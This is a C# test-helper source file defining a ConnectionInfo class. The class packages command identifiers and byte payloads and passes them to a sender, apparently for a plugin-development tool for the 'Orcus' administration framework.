using System;
using System.IO;
using System.Net.Sockets;
using System.Threading.Tasks;
using Orcus.Administration.Plugins.CommandViewPlugin;
using Orcus.Shared.Connection;
using Orcus.Shared.Data;

namespace OrcusPluginStudio.Core.Test.AdministrationVirtualisation
{
    public class ConnectionInfo : IConnectionInfo
    {
        public ConnectionInfo(OnlineClientInformation clientInformation, ISender sender)
        {
            ClientInformation = clientInformation;
            Sender = sender;
        }

        public TcpClient TcpClient { get; } = new TcpClient();

        public ISender Sender { get; }
        public OnlineClientInformation ClientInformation { get; }

        public Task SendCommand(Command command, byte[] data,
            PackageCompression packageCompression = PackageCompression.Auto)
        {
            var package = new byte[data.Length + 4];
            Buffer.BlockCopy(BitConverter.GetBytes(command.Identifier), 0, package, 0, 4);
            Buffer.BlockCopy(data, 0, package, 4, data.Length);

            Sender.SendCommand(ClientInformation.Id, package, packageCompression);
            return Task.FromResult(false);
        }

        public Task SendCommand(Command command, byte data)
        {
            return SendCommand(command, new[] {data});
        }

        public Task SendCommand(Command command, IDataInfo dataInfo)
        {
            return SendCommand(command, dataInfo.ToArray());
        }

        public Task UnsafeSendCommand(Command command, int length, Action<BinaryWriter> writerCall)
        {
            using (var memoryStream = new MemoryStream(length))
            using (var binaryWriter = new BinaryWriter(memoryStream))
            {
                writerCall(binaryWriter);
                return SendCommand(command, memoryStream.ToArray());
            }
        }

        public Task UnsafeSendCommand(Command command, WriterCall writerCall)
        {
            using (var memoryStream = new MemoryStream(writerCall.Size))
            {
                writerCall.WriteIntoStream(memoryStream);
                return SendCommand(command, memoryStream.ToArray());
            }
        }
    }
}